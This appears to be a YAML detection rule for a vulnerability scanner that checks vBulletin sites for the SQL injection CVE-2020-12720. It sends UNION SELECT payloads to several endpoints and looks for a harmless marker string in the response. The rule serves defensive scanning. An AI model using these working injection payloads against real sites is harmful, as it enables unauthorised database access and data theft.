send:
  - method: 'POST'
    url: '/ajax/api/content_infraction/getIndexableContent'
    headers:
      - CONTENT-TYPE: application/x-www-form-urlencoded; charset=UTF-8
      - X-REQUESTED-WITH: XMLHttpRequest
    body: "nodeId[nodeid]=1+UNION+SELECT+26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,CHAR(119,108,114,109,45,115,113,108,105,45,99,104,101,99,107,45,106,120,115,104,119),8,7,6,5,4,3,2,1--"

  - method: 'POST'
    url: '/forum/ajax/api/content_infraction/getIndexableContent'
    headers:
      - CONTENT-TYPE: application/x-www-form-urlencoded; charset=UTF-8
      - X-REQUESTED-WITH: XMLHttpRequest
    body: "nodeId[nodeid]=1+UNION+SELECT+26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,CHAR(119,108,114,109,45,115,113,108,105,45,99,104,101,99,107,45,106,120,115,104,119),8,7,6,5,4,3,2,1--"

  - method: 'POST'
    url: '/forums/ajax/api/content_infraction/getIndexableContent'
    headers:
      - CONTENT-TYPE: application/x-www-form-urlencoded; charset=UTF-8
      - X-REQUESTED-WITH: XMLHttpRequest
    body: "nodeId[nodeid]=1+UNION+SELECT+26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,CHAR(119,108,114,109,45,115,113,108,105,45,99,104,101,99,107,45,106,120,115,104,119),8,7,6,5,4,3,2,1--"

  - method: 'POST'
    url: '/'
    headers:
      - CONTENT-TYPE: application/x-www-form-urlencoded; charset=UTF-8
      - X-REQUESTED-WITH: XMLHttpRequest
    body: "routestring=ajax/api/content_infraction/getIndexableContent&nodeId[nodeid]=1+UNION+SELECT+26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,CHAR(119,108,114,109,45,115,113,108,105,45,99,104,101,99,107,45,106,120,115,104,119),8,7,6,5,4,3,2,1--"

detect:
  - response:
    - body: 'wlrm-sqli-check-jxshw'

meta-info:
  - type: sqli
  - threat: 98
  - applicable_for:
    - fast
    - scanner
  - title: "SQL injection in vBulletin (CVE-2020-12720)"
  - description: "Improper access control for the 'nodeId' parameter allows attackers to execute arbitrary SQL commands. A successful exploitation of SQLi could result in reading sensitive data from the database, modifying this data, and in some cases even execution of arbitrary commands in the OS. Known affected software configurations vBulletin before 5.5.6pl1, 5.6.0 before 5.6.0pl1, and 5.6.1 before 5.6.1pl1."
  - additional: "To resolve this vulnerability, the software should be updated to the current version."
  - tags:
    - CVE-2020-12720
    - vBulletin
